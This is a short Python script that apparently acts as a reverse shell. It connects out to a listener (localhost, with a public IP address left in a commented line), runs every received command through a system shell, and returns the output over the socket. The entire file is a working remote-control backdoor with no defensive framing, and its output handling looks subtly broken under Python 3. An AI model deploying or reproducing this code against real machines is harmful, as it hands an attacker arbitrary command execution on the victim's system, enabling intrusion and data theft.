#-*- coding: UTF-8 -*-
import socket
import subprocess
from threading import Thread

def shell(command):
    proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    stdout_value = proc.stdout.read() + proc.stderr.read()

    print ('Command: {}\nOutput: {}'.format(command, stdout_value))
    server.sendall(stdout_value.encode('utf-8'))

server = socket.socket(
    family=socket.AF_INET,      # internet ipv4
    type=socket.SOCK_STREAM)

server.connect(('127.0.0.1', 1235))
# server.connect(('104.155.123.11', 1231))

while True:
    command = server.recv(1024).strip()
    if not command:
        break

    thread = Thread(target=shell, args=(command,))
    thread.start()

server.close()
